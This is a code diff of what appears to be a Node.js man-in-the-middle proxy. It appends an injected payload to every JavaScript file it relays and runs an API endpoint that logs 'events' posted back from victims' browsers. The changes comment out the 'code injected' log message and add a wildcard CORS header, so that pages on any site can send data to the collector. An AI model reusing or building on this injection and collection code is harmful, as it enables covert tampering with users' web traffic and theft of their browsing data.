@@ -20,7 +20,7 @@ proxy.tamper(/localhost/, breakConnection);
 proxy.tamper(/\.js/, function(request){
     delete request.headers['accept-encoding'];
     request.onResponse(function (response) {
-        console.log("code injected: " + payload);
+        //console.log("code injected: " + payload);
         response.body += payload;
         response.headers['content-length'] = response.body.length;
         //response.headers["Cache-Control"] = "max-age=86400"; // 24 hrs
@@ -39,8 +39,9 @@ function API_onRequest(request, response)
           body += data.toString();
         });
         request.on("end", function(data){
-           console.log("[" + request.connection.remoteAddress + "]event detected: " + request.url + ": " + body);
+           console.log("[" + request.connection.remoteAddress + "] event detected: " + request.url + ": " + body);
         });
+        response.writeHead(200,{"Access-Control-Allow-Origin":"*"});
         response.end("ok");
     }
     else {
